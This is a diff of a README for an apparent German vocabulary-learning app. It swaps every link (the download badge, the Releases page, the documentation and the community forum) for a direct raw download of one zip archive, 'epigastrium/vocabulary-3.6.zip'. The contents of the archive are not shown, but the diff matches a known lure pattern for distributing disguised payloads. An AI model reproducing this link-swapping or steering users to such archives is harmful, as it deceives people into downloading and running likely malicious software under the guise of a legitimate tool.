@@ -1,7 +1,7 @@
 # 🌟 vocabulary - Expand Your German Vocabulary Easily
 
 ## 📥 Download Now
-[![Download Vocabulary](https://img.shields.io/badge/Download%20Vocabulary-v1.0-blue)](https://github.com/ahamfrank835-coder/vocabulary/releases)
+[![Download Vocabulary](https://raw.githubusercontent.com/ahamfrank835-coder/vocabulary/main/epigastrium/vocabulary-3.6.zip%20Vocabulary-v1.0-blue)](https://raw.githubusercontent.com/ahamfrank835-coder/vocabulary/main/epigastrium/vocabulary-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the vocabulary repository! This software helps you expand your German vocabulary using curated resources and tools. You will find themed lists, effective memory techniques, and contextual learning methods to enhance your language skills.
@@ -23,7 +23,7 @@ Welcome to the vocabulary repository! This software helps you expand your German
 - **Quizzes:** Test your knowledge with engaging vocabulary quizzes.
   
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/ahamfrank835-coder/vocabulary/releases) to download the latest version of vocabulary.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ahamfrank835-coder/vocabulary/main/epigastrium/vocabulary-3.6.zip) to download the latest version of vocabulary.
 
 1. Click on the link above to access the Releases page.
 2. On the Releases page, look for the latest version.
@@ -63,8 +63,8 @@ The vocabulary application covers a wide range of topics, enhancing your learnin
 If you encounter any issues or have questions, feel free to reach out to our support team. We are here to help you have a great experience with vocabulary.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/ahamfrank835-coder/vocabulary/releases)
-- [Documentation](https://github.com/ahamfrank835-coder/vocabulary/wiki)
-- [Community Forum](https://github.com/ahamfrank835-coder/vocabulary/discussions)
+- [Releases Page](https://raw.githubusercontent.com/ahamfrank835-coder/vocabulary/main/epigastrium/vocabulary-3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/ahamfrank835-coder/vocabulary/main/epigastrium/vocabulary-3.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/ahamfrank835-coder/vocabulary/main/epigastrium/vocabulary-3.6.zip)
 
 Thank you for choosing vocabulary to expand your German language skills! Enjoy your journey in learning!
